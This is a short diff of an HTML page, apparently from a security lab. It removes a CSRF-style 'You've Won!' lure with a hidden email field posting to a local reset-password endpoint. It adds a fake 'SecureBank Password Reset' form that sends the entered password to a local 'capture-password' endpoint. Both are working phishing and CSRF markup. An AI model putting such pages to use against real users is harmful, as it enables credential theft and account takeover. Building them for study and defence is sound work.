@@ -2,17 +2,13 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Special Offer!</title>
+    <title>SecureBank Password Reset</title>
 </head>
 <body>
-
-    <h1>Congratulations! You've Won!</h1>
-    <p>Click the button below to claim your prize.</p>
-
-    <form action="http://localhost:5000/reset-password" method="POST">
-        <input type="hidden" name="email" value="victim@example.com">
-        <input type="submit" value="Click Here for a Special Offer!">
+    <h2>Reset Your Password</h2>
+    <form action="http://localhost:5000/capture-password" method="POST">
+        <input type="password" name="password" placeholder="Enter new password">
+        <input type="submit" value="Reset Password">
     </form>
-
 </body>
 </html>
